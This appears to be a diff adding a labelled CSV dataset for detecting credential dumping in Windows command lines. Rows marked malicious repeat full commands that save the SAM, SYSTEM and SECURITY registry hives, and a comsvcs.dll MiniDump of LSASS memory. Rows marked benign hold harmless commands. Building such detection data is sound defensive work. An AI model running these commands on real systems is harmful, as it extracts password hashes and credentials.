@@ -1,0 +1,2001 @@
+text,label
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
